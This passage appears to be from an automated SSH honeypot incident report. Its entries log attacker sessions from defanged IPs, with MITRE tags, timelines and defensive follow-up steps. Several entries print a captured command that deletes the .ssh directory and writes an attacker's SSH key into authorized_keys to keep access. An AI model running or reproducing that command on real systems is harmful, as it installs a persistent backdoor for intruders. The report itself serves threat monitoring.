| **Last Seen** | 2026-05-22 16:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 16:28:34` | `cowrie.session.connect` |
| `2026-05-22 16:28:34` | `cowrie.client.version` |
| `2026-05-22 16:28:34` | `cowrie.client.kex` |
| `2026-05-22 16:28:34` | `cowrie.login.success` |
| `2026-05-22 16:28:35` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.9.145[.]130` to AbuseIPDB if not already reported
- [ ] Block `81.9.145[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-19ce27737554

| Field | Detail |
|---|---|
| **Source IP** | `81.9.145[.]130` |
| **First Seen** | 2026-05-22 16:33 |
| **Last Seen** | 2026-05-22 16:33 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 16:33:47` | `cowrie.session.connect` |
| `2026-05-22 16:33:47` | `cowrie.client.version` |
| `2026-05-22 16:33:47` | `cowrie.client.kex` |
| `2026-05-22 16:33:48` | `cowrie.login.success` |
| `2026-05-22 16:33:48` | `cowrie.session.params` |
| `2026-05-22 16:33:49` | `cowrie.command.input` |
| `2026-05-22 16:33:49` | `cowrie.command.failed` |
| `2026-05-22 16:33:49` | `cowrie.log.closed` |
| `2026-05-22 16:33:49` | `cowrie.session.params` |
| `2026-05-22 16:33:49` | `cowrie.command.input` |
| `2026-05-22 16:33:49` | `cowrie.session.file_download` |
| `2026-05-22 16:33:49` | `cowrie.log.closed` |
| `2026-05-22 16:33:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.9.145[.]130` to AbuseIPDB if not already reported
- [ ] Block `81.9.145[.]130` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1983f39317b

| Field | Detail |
|---|---|
| **Source IP** | `81.9.145[.]130` |
| **First Seen** | 2026-05-22 16:33 |
| **Last Seen** | 2026-05-22 16:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 16:33:52` | `cowrie.session.connect` |
| `2026-05-22 16:33:52` | `cowrie.client.version` |
| `2026-05-22 16:33:52` | `cowrie.client.kex` |
| `2026-05-22 16:33:53` | `cowrie.login.success` |
| `2026-05-22 16:33:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `81.9.145[.]130` to AbuseIPDB if not already reported
- [ ] Block `81.9.145[.]130` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3a7cc6db7aac

| Field | Detail |
|---|---|
| **Source IP** | `186.146.235[.]58` |
| **First Seen** | 2026-05-22 17:10 |
| **Last Seen** | 2026-05-22 17:10 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 17:10:09` | `cowrie.session.connect` |
| `2026-05-22 17:10:09` | `cowrie.client.version` |
| `2026-05-22 17:10:09` | `cowrie.client.kex` |
| `2026-05-22 17:10:11` | `cowrie.login.success` |
| `2026-05-22 17:10:11` | `cowrie.session.params` |
| `2026-05-22 17:10:11` | `cowrie.command.input` |
| `2026-05-22 17:10:11` | `cowrie.command.failed` |
| `2026-05-22 17:10:12` | `cowrie.log.closed` |
| `2026-05-22 17:10:12` | `cowrie.session.params` |
| `2026-05-22 17:10:12` | `cowrie.command.input` |
| `2026-05-22 17:10:13` | `cowrie.session.file_download` |
| `2026-05-22 17:10:13` | `cowrie.log.closed` |
| `2026-05-22 17:10:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.146.235[.]58` to AbuseIPDB if not already reported
- [ ] Block `186.146.235[.]58` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1be5dbf81e03

| Field | Detail |
|---|---|
| **Source IP** | `186.146.235[.]58` |
| **First Seen** | 2026-05-22 17:10 |
| **Last Seen** | 2026-05-22 17:10 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 17:10:16` | `cowrie.session.connect` |
| `2026-05-22 17:10:16` | `cowrie.client.version` |
| `2026-05-22 17:10:16` | `cowrie.client.kex` |
| `2026-05-22 17:10:18` | `cowrie.login.success` |
| `2026-05-22 17:10:18` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `186.146.235[.]58` to AbuseIPDB if not already reported
- [ ] Block `186.146.235[.]58` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-00da79c445b1

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-22 17:17 |
| **Last Seen** | 2026-05-22 17:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 17:17:44` | `cowrie.session.connect` |
| `2026-05-22 17:17:44` | `cowrie.client.version` |
| `2026-05-22 17:17:44` | `cowrie.client.kex` |
| `2026-05-22 17:17:45` | `cowrie.login.success` |
| `2026-05-22 17:17:46` | `cowrie.session.params` |
| `2026-05-22 17:17:46` | `cowrie.command.input` |
| `2026-05-22 17:17:46` | `cowrie.command.failed` |
| `2026-05-22 17:17:46` | `cowrie.log.closed` |
| `2026-05-22 17:17:47` | `cowrie.session.params` |
| `2026-05-22 17:17:47` | `cowrie.command.input` |
| `2026-05-22 17:17:47` | `cowrie.session.file_download` |
| `2026-05-22 17:17:47` | `cowrie.log.closed` |
| `2026-05-22 17:17:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-09fde640aab1

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-22 17:17 |
| **Last Seen** | 2026-05-22 17:17 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 17:17:51` | `cowrie.session.connect` |
| `2026-05-22 17:17:51` | `cowrie.client.version` |
| `2026-05-22 17:17:51` | `cowrie.client.kex` |
| `2026-05-22 17:17:52` | `cowrie.login.success` |
| `2026-05-22 17:17:52` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6fe90518d39d

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-22 17:19 |
| **Last Seen** | 2026-05-22 17:19 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 17:19:31` | `cowrie.session.connect` |
| `2026-05-22 17:19:31` | `cowrie.client.version` |
| `2026-05-22 17:19:31` | `cowrie.client.kex` |
| `2026-05-22 17:19:32` | `cowrie.login.success` |
| `2026-05-22 17:19:33` | `cowrie.session.params` |
| `2026-05-22 17:19:33` | `cowrie.command.input` |
| `2026-05-22 17:19:33` | `cowrie.command.failed` |
| `2026-05-22 17:19:33` | `cowrie.log.closed` |
| `2026-05-22 17:19:34` | `cowrie.session.params` |
| `2026-05-22 17:19:34` | `cowrie.command.input` |
| `2026-05-22 17:19:34` | `cowrie.session.file_download` |
| `2026-05-22 17:19:34` | `cowrie.log.closed` |
| `2026-05-22 17:19:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-683c3e52ab86

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-22 17:19 |
| **Last Seen** | 2026-05-22 17:19 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 17:19:37` | `cowrie.session.connect` |
| `2026-05-22 17:19:37` | `cowrie.client.version` |
| `2026-05-22 17:19:38` | `cowrie.client.kex` |
| `2026-05-22 17:19:39` | `cowrie.login.success` |
| `2026-05-22 17:19:39` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cfce1ec5287f

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-22 17:21 |
| **Last Seen** | 2026-05-22 17:21 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 17:21:21` | `cowrie.session.connect` |
| `2026-05-22 17:21:21` | `cowrie.client.version` |
| `2026-05-22 17:21:22` | `cowrie.client.kex` |
| `2026-05-22 17:21:23` | `cowrie.login.success` |
| `2026-05-22 17:21:23` | `cowrie.session.params` |
| `2026-05-22 17:21:23` | `cowrie.command.input` |
| `2026-05-22 17:21:23` | `cowrie.command.failed` |
| `2026-05-22 17:21:24` | `cowrie.log.closed` |
| `2026-05-22 17:21:24` | `cowrie.session.params` |
| `2026-05-22 17:21:24` | `cowrie.command.input` |
| `2026-05-22 17:21:25` | `cowrie.session.file_download` |
| `2026-05-22 17:21:25` | `cowrie.log.closed` |
| `2026-05-22 17:21:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d9b43160fd08

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-22 17:21 |
| **Last Seen** | 2026-05-22 17:21 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 17:21:28` | `cowrie.session.connect` |
| `2026-05-22 17:21:28` | `cowrie.client.version` |
| `2026-05-22 17:21:28` | `cowrie.client.kex` |
| `2026-05-22 17:21:30` | `cowrie.login.success` |
| `2026-05-22 17:21:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-838b85ec793e

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-22 17:26 |
| **Last Seen** | 2026-05-22 17:26 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 17:26:46` | `cowrie.session.connect` |
| `2026-05-22 17:26:46` | `cowrie.client.version` |
| `2026-05-22 17:26:46` | `cowrie.client.kex` |
| `2026-05-22 17:26:47` | `cowrie.login.success` |
| `2026-05-22 17:26:48` | `cowrie.session.params` |
| `2026-05-22 17:26:48` | `cowrie.command.input` |
| `2026-05-22 17:26:48` | `cowrie.command.failed` |
| `2026-05-22 17:26:48` | `cowrie.log.closed` |
| `2026-05-22 17:26:49` | `cowrie.session.params` |
| `2026-05-22 17:26:49` | `cowrie.command.input` |
| `2026-05-22 17:26:49` | `cowrie.session.file_download` |
| `2026-05-22 17:26:49` | `cowrie.log.closed` |
| `2026-05-22 17:26:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-88a5fb2c37ed

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-22 17:26 |
| **Last Seen** | 2026-05-22 17:26 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 17:26:53` | `cowrie.session.connect` |
| `2026-05-22 17:26:53` | `cowrie.client.version` |
| `2026-05-22 17:26:53` | `cowrie.client.kex` |
| `2026-05-22 17:26:54` | `cowrie.login.success` |
| `2026-05-22 17:26:54` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b2be3411c5f9

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-22 17:27 |
| **Last Seen** | 2026-05-22 17:27 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 17:27:13` | `cowrie.session.connect` |
| `2026-05-22 17:27:13` | `cowrie.client.version` |
| `2026-05-22 17:27:13` | `cowrie.client.kex` |
| `2026-05-22 17:27:14` | `cowrie.login.success` |
| `2026-05-22 17:27:15` | `cowrie.session.params` |
| `2026-05-22 17:27:15` | `cowrie.command.input` |
| `2026-05-22 17:27:15` | `cowrie.command.failed` |
| `2026-05-22 17:27:15` | `cowrie.log.closed` |
| `2026-05-22 17:27:16` | `cowrie.session.params` |
| `2026-05-22 17:27:16` | `cowrie.command.input` |
| `2026-05-22 17:27:16` | `cowrie.session.file_download` |
| `2026-05-22 17:27:16` | `cowrie.log.closed` |
| `2026-05-22 17:27:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9086dbc93924

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-22 17:27 |
| **Last Seen** | 2026-05-22 17:27 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 17:27:20` | `cowrie.session.connect` |
| `2026-05-22 17:27:20` | `cowrie.client.version` |
| `2026-05-22 17:27:20` | `cowrie.client.kex` |
| `2026-05-22 17:27:21` | `cowrie.login.success` |
| `2026-05-22 17:27:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f0c1b2fd6d3a

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-22 17:28 |
| **Last Seen** | 2026-05-22 17:28 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 17:28:41` | `cowrie.session.connect` |
| `2026-05-22 17:28:41` | `cowrie.client.version` |
| `2026-05-22 17:28:41` | `cowrie.client.kex` |
| `2026-05-22 17:28:43` | `cowrie.login.success` |
| `2026-05-22 17:28:43` | `cowrie.session.params` |
| `2026-05-22 17:28:43` | `cowrie.command.input` |
| `2026-05-22 17:28:43` | `cowrie.command.failed` |
| `2026-05-22 17:28:44` | `cowrie.log.closed` |
| `2026-05-22 17:28:44` | `cowrie.session.params` |
| `2026-05-22 17:28:44` | `cowrie.command.input` |
| `2026-05-22 17:28:45` | `cowrie.session.file_download` |
| `2026-05-22 17:28:45` | `cowrie.log.closed` |
| `2026-05-22 17:28:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-afac21fdb16e

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-22 17:28 |
| **Last Seen** | 2026-05-22 17:28 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-05-22 17:28:48` | `cowrie.session.connect` |
| `2026-05-22 17:28:48` | `cowrie.client.version` |
| `2026-05-22 17:28:48` | `cowrie.client.kex` |
| `2026-05-22 17:28:50` | `cowrie.login.success` |
| `2026-05-22 17:28:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `102.88.137[.]80` to AbuseIPDB if not already reported
- [ ] Block `102.88.137[.]80` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-162231c12478

| Field | Detail |
|---|---|
| **Source IP** | `102.88.137[.]80` |
| **First Seen** | 2026-05-22 17:30 |
| **Last Seen** | 2026-05-22 17:30 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
